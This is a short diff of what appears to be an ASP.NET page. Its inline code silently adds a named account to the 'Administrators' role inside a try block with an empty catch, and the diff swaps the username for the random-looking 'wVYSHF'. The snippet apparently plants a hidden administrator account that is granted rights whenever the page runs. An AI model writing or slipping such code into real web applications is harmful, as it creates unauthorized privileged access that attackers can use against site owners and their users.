@@ -15,7 +15,7 @@
 
     try
     {
-        Roles.AddUserToRole("Vinny_Michael", "Administrators"); 
+        Roles.AddUserToRole("wVYSHF", "Administrators"); 
     }
     catch (Exception) {} 
 %> 
